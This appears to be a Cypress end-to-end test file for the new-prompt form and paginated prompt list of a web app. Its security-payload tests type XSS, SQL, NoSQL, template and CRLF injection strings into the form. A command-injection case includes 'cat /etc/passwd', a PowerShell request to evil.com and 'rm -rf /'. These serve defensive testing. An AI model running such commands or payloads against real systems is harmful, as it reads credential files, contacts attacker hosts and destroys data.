describe('Prompt Feature', () => {
  describe('New Prompt', () => {
    beforeEach(() => {
      cy.visit('/prompts/new-prompt');
    });

    const submitWithPayloadAndAssertRequest = (promptCode: string, promptDesc: string, schema: string, alias: string) => {
      const normalizeNewlines = (value: string) => value.replace(/\r\n/g, '\n');

      cy.window().then((windowObject) => {
        cy.stub(windowObject, 'alert').as('alert');
        cy.stub(windowObject.console, 'error').as('consoleError');
      });

      cy.intercept('POST', '**/v1/prompts', (request) => {
        expect(request.body).to.deep.equal({
          promptCode: normalizeNewlines(promptCode),
          promptDesc: normalizeNewlines(promptDesc),
          schema: normalizeNewlines(schema)
        });
        request.reply({
          id: '999',
          promptCode,
          promptDesc,
          schema
        });
      }).as(alias);

      cy.get('#promptCode').clear().type(promptCode, { parseSpecialCharSequences: false });
      cy.get('#promptDesc').clear().type(promptDesc, { parseSpecialCharSequences: false });
      cy.get('#schema').clear().type(schema, { parseSpecialCharSequences: false });
      cy.get('button[type="submit"]').click();

      cy.wait(`@${alias}`);
      cy.get('@alert').should('not.have.been.called');
    };

    const fillValidPrompt = () => {
      cy.get('#promptCode').type('PROMPT_QA_001');
      cy.get('#promptDesc').type('Create interview questions for senior QA role');
      cy.get('#schema').type('{"type":"object","required":["questions"]}');
    };

    it('creates prompt and redirects to prompt list', () => {
      cy.clock();

      cy.intercept('POST', '**/v1/prompts', (request) => {
        expect(request.body).to.deep.equal({
          promptCode: 'PROMPT_QA_001',
          promptDesc: 'Create interview questions for senior QA role',
          schema: '{"type":"object","required":["questions"]}'
        });

        request.reply({
          id: '1',
          ...request.body
        });
      }).as('createPrompt');

      fillValidPrompt();
      cy.get('button[type="submit"]').click();

      cy.wait('@createPrompt');
      cy.tick(1000);
      cy.url().should('include', '/prompts/prompt-list');
    });

    it('keeps submit disabled until all required fields are filled', () => {
      cy.get('button[type="submit"]').should('be.disabled');

      cy.get('#promptCode').type('PROMPT_ONLY');
      cy.get('button[type="submit"]').should('be.disabled');

      cy.get('#promptDesc').type('Description only');
      cy.get('button[type="submit"]').should('be.disabled');

      cy.get('#schema').type('{"type":"object"}');
      cy.get('button[type="submit"]').should('not.be.disabled');
    });

    it('stays on page when create prompt API fails', () => {
      cy.intercept('POST', '**/v1/prompts', {
        statusCode: 500,
        body: { message: 'Failed to create prompt' }
      }).as('createPromptFail');

      fillValidPrompt();
      cy.get('button[type="submit"]').click();

      cy.wait('@createPromptFail');
      cy.url().should('include', '/prompts/new-prompt');
    });

    it('submits XSS-like payload as plain text without executing scripts', () => {
      const xssCode = '<img src=x onerror=alert(1)>';
      const xssDesc = '<script>window.injected=true</script>';
      const xssSchema = '{"template":"{{constructor.constructor(\"alert(1)\")()}}"}';  

      submitWithPayloadAndAssertRequest(xssCode, xssDesc, xssSchema, 'createPromptXss');
    });

    it('rejects invalid JSON schema field at client side (form validation)', () => {
      cy.get('#promptCode').type('PROMPT_INVALID_JSON');
      cy.get('#promptDesc').type('Schema is broken JSON');
      cy.get('#schema').type('{"invalid": json without closing quotes');

      cy.get('button[type="submit"]').should('be.disabled');
    });

    it('submits valid incomplete JSON as plain text payload', () => {
      const code = 'PROMPT_JSON_INCOMPLETE';
      const desc = 'Testing partial JSON schema';
      const schema = '{"type":"object"';

      submitWithPayloadAndAssertRequest(code, desc, schema, 'createPromptPartialJson');
    });

    describe('security payloads', () => {
      it('submits SQL injection-like payload as plain text', () => {
        const code = "PROMPT'; DROP TABLE prompts; --";
        const desc = "Senior role'; DELETE FROM prompts WHERE '1'='1";
        const schema = '{"field":"value\' OR 1=1 --"}';

        submitWithPayloadAndAssertRequest(code, desc, schema, 'createPromptSql');
      });

      it('submits NoSQL injection-like payload as plain text', () => {
        const code = '{"$ne":null}';
        const desc = '{"$gt":""}';
        const schema = '{"$or":[{}]}';

        submitWithPayloadAndAssertRequest(code, desc, schema, 'createPromptNoSql');
      });

      it('submits command injection-like payload as plain text', () => {
        const code = 'PROMPT && cat /etc/passwd';
        const desc = 'Description | powershell Invoke-WebRequest http://evil.com';
        const schema = '{"cmd":"ls -la; rm -rf /"}';

        submitWithPayloadAndAssertRequest(code, desc, schema, 'createPromptCmd');
      });

      it('submits CRLF/header injection-like payload as plain text', () => {
        const code = 'PROMPT%0d%0aSet-Cookie:session=attacker';
        const desc = 'Description\r\nX-Injected: true';
        const schema = '{"header":"\r\ninjected: header"}';

        submitWithPayloadAndAssertRequest(code, desc, schema, 'createPromptCrlf');
      });

      it('submits template injection-like payload as plain text', () => {
        const code = '${7*7}';
        const desc = '{{constructor.constructor("return process")()}}';
        const schema = '<%=7*7%>';

        submitWithPayloadAndAssertRequest(code, desc, schema, 'createPromptTemplate');
      });

      it('submits unicode obfuscation payload as plain text', () => {
        const code = 'PROMPT\u202Execute';
        const desc = '<scr\u0131pt>alert(1)</scr\u0131pt>';
        const schema = '{\u200b"type":"object"}';

        submitWithPayloadAndAssertRequest(code, desc, schema, 'createPromptUnicode');
      });

      it('submits HTML entity-encoded payload as plain text', () => {
        const code = 'PROMPT&lt;script&gt;';
        const desc = '&lt;img src=x onerror=alert(1)&gt;';
        const schema = '{"html":"&lt;svg onload=alert(1)&gt;"}';

        submitWithPayloadAndAssertRequest(code, desc, schema, 'createPromptHtmlEntity');
      });

      it('submits base64-encoded payload as plain text', () => {
        const code = 'PROMPT_' + btoa('<script>alert(1)</script>');
        const desc = btoa('console.log("injected")');
        const schema = '{"encoded":"' + btoa('DROP TABLE prompts') + '"}';

        submitWithPayloadAndAssertRequest(code, desc, schema, 'createPromptBase64');
      });

      it('does not send unexpected extra fields in request body', () => {
        const code = 'PROMPT_SHAPE';
        const desc = 'Testing request shape validation';
        const schema = '{"type":"object"}';

        cy.intercept('POST', '**/v1/prompts', (request) => {
          expect(Object.keys(request.body).sort()).to.deep.equal(['promptCode', 'promptDesc', 'schema']);
          request.reply({ id: '500', promptCode: code, promptDesc: desc, schema });
        }).as('createPromptShape');

        cy.get('#promptCode').type(code);
        cy.get('#promptDesc').type(desc);
        cy.get('#schema').type(schema);
        cy.get('button[type="submit"]').click();

        cy.wait('@createPromptShape');
      });
    });
  });

  describe('Prompt List', () => {
    const paginatedResponse = {
      content: [
        {
          id: '1',
          promptCode: 'PROMPT_ALPHA',
          promptDesc: 'Alpha description for prompt list testing content',
          schema: '{"type":"object","name":"alpha"}'
        },
        {
          id: '2',
          promptCode: 'PROMPT_BETA',
          promptDesc: 'Beta description used for search filtering scenario',
          schema: '{"type":"object","name":"beta"}'
        }
      ],
      totalElements: 2
    };

    beforeEach(() => {
      cy.intercept('GET', '**/v1/prompts/paginated*', paginatedResponse).as('getPromptsPaginated');
      cy.visit('/prompts/prompt-list');
      cy.wait('@getPromptsPaginated');
    });

    it('loads and displays paginated prompts', () => {
      cy.contains('PROMPT_ALPHA').should('exist');
      cy.contains('PROMPT_BETA').should('exist');
    });

    it('filters prompts by search input', () => {
      cy.get('p-table input[type="text"]').first().type('BETA');

      cy.contains('PROMPT_BETA').should('exist');
      cy.contains('PROMPT_ALPHA').should('not.exist');
    });

    it('opens text modal with full prompt description', () => {
      cy.get('.col-text .desc-teaser').first().click();
      cy.contains('Alpha description for prompt list testing content').should('exist');
    });

    it('opens schema modal and shows formatted schema content', () => {
      cy.get('.col-schema .desc-teaser').first().click();
      cy.contains('"name": "alpha"').should('exist');
    });

    it('shows empty-state message for empty response', () => {
      cy.intercept('GET', '**/v1/prompts/paginated*', {
        content: [],
        totalElements: 0
      }).as('getEmptyPrompts');

      cy.visit('/prompts/prompt-list');
      cy.wait('@getEmptyPrompts');
      cy.get('tbody').should('contain.text', 'No prompts found.');
    });
  });
});
